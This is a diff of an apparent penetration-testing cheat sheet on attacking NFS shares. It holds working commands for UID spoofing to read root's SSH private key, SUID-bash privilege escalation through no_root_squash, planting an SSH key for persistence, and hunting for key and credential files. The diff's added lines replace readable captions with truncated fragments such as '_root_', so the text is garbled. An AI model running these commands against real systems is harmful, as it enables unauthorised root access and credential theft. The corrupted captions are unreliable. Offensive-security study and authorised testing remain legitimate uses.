@@ -3,7 +3,7 @@ id: "3ax6bs57nmpsiuwrn"
 title: "nfs"
 description: ""
 tags: []
-order: 5
+order: "5"
 createdAt: "2026-05-30T15:44:56.675Z"
 updatedAt: "2026-05-30T15:45:08.094Z"
 ---
@@ -177,6 +177,8 @@ su fakeusr
 cat /mnt/nfs_share/root/.ssh/id_rsa
 ```
 
+_share/root/.ssh/id_
+
 **Tags:** nfs, uid-spoofing, privilege-escalation, misconfiguration
 <!-- cmd: {"id":"t31i7kbmumpsiv5f8","language":"bash","sectionId":"8ie0g0gl7mpsiv5bd","tags":["nfs","uid-spoofing","privilege-escalation","misconfiguration"]} -->
 
@@ -196,7 +198,7 @@ sudo -u '#1001' cat /mnt/nfs_share/home/$USER/file
 showmount -e $TARGET
 ```
 
-_no_root_squash Exploitation If `no_root_squash` is set, root on client = root on server._
+_no_
 
 **Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
 <!-- cmd: {"id":"ljp871tdwmpsiv5fj","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->
@@ -206,6 +208,8 @@ _no_root_squash Exploitation If `no_root_squash` is set, root on client = root o
 cat /etc/exports
 ```
 
+_root_
+
 **Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
 <!-- cmd: {"id":"uqyyv8kx8mpsiv5fm","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->
 
@@ -213,6 +217,8 @@ cat /etc/exports
 ```bash
 mount -t nfs $TARGET:/share /mnt/nfs_share
 ```
+
+_root_
 
 **Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
 <!-- cmd: {"id":"rj0nefc13mpsiv5fr","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->
@@ -222,6 +228,8 @@ mount -t nfs $TARGET:/share /mnt/nfs_share
 cp /bin/bash /mnt/nfs_share/bash
 ```
 
+_root_
+
 **Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
 <!-- cmd: {"id":"t5wfyai1umpsiv5fv","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->
 
@@ -229,6 +237,8 @@ cp /bin/bash /mnt/nfs_share/bash
 ```bash
 chmod +s /mnt/nfs_share/bash
 ```
+
+_root_
 
 **Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
 <!-- cmd: {"id":"106g482mjmpsiv5fy","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->
@@ -238,6 +248,8 @@ chmod +s /mnt/nfs_share/bash
 /tmp/bash -p
 ```
 
+_root_
+
 **Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
 <!-- cmd: {"id":"q8g3og4bdmpsiv5g3","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->
 
@@ -245,6 +257,8 @@ chmod +s /mnt/nfs_share/bash
 ```bash
 /mnt/nfs_share/bash -p
 ```
+
+_root_
 
 **Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
 <!-- cmd: {"id":"29uc92m4empsiv5g6","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->
@@ -275,6 +289,8 @@ mkdir -p /mnt/nfs_share/.ssh
 echo "$(cat ~/.ssh/id_rsa.pub)" >> /mnt/nfs_share/.ssh/authorized_keys
 ```
 
+_rsa.pub)" >> /mnt/nfs_
+
 **Tags:** nfs, ssh-key, persistence, privilege-escalation
 <!-- cmd: {"id":"nbrm934xwmpsiv5gu","language":"bash","sectionId":"3bwhqp6z1mpsiv5bl","tags":["nfs","ssh-key","persistence","privilege-escalation"]} -->
 
@@ -282,6 +298,8 @@ echo "$(cat ~/.ssh/id_rsa.pub)" >> /mnt/nfs_share/.ssh/authorized_keys
 ```bash
 chmod 600 /mnt/nfs_share/.ssh/authorized_keys
 ```
+
+_share/.ssh/authorized_
 
 **Tags:** nfs, ssh-key, persistence, privilege-escalation
 <!-- cmd: {"id":"2q616nxlfmpsiv5gx","language":"bash","sectionId":"3bwhqp6z1mpsiv5bl","tags":["nfs","ssh-key","persistence","privilege-escalation"]} -->
@@ -311,6 +329,8 @@ _NFS Sensitive File Hunt_
 ```bash
 find /mnt/nfs_share -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
 ```
+
+_share -name "*.key" -o -name "*.pem" -o -name "id_
 
 **Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
 <!-- cmd: {"id":"t8yjrixr2mpsiv5hj","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->
@@ -363,7 +383,7 @@ grep -r "secret" /mnt/nfs_share/ 2>/dev/null
 nfs4_getfacl /mnt/nfs_share/
 ```
 
-_NFSv4 ACL Enumeration_
+_getfacl /mnt/nfs_
 
 **Tags:** nfs, nfsv4, acl, enumeration
 <!-- cmd: {"id":"rojz65ifhmpsiv5ih","language":"bash","sectionId":"2dkfwcz71mpsiv5bs","tags":["nfs","nfsv4","acl","enumeration"]} -->
@@ -372,6 +392,8 @@ _NFSv4 ACL Enumeration_
 ```bash
 nfs4_getfacl /mnt/nfs_share/sensitive_file
 ```
+
+_getfacl /mnt/nfs_
 
 **Tags:** nfs, nfsv4, acl, enumeration
 <!-- cmd: {"id":"jhtertu0vmpsiv5ik","language":"bash","sectionId":"2dkfwcz71mpsiv5bs","tags":["nfs","nfsv4","acl","enumeration"]} -->
@@ -434,7 +456,7 @@ run
 grep no_root_squash /etc/exports
 ```
 
-_Common Misconfigurations_
+_root_
 
 **Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
 <!-- cmd: {"id":"6no0m6mvmmpsiv5jp","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->
@@ -444,6 +466,8 @@ _Common Misconfigurations_
 cat /etc/exports
 ```
 
+_root_
+
 **Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
 <!-- cmd: {"id":"u9ehj1qlsmpsiv5jt","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->
 
@@ -451,6 +475,8 @@ cat /etc/exports
 ```bash
 showmount -e $TARGET
 ```
+
+_root_
 
 **Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
 <!-- cmd: {"id":"cgm4zk0cbmpsiv5jx","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->
@@ -460,6 +486,8 @@ showmount -e $TARGET
 ls -la /mnt/nfs_share/
 ```
 
+_root_
+
 **Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
 <!-- cmd: {"id":"3jpnc4065mpsiv5k0","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->
 
@@ -467,6 +495,8 @@ ls -la /mnt/nfs_share/
 ```bash
 mount -t nfs $TARGET:/share /mnt/nfs_share -o anon
 ```
+
+_root_
 
 **Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
 <!-- cmd: {"id":"pe733b8y8mpsiv5k4","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->
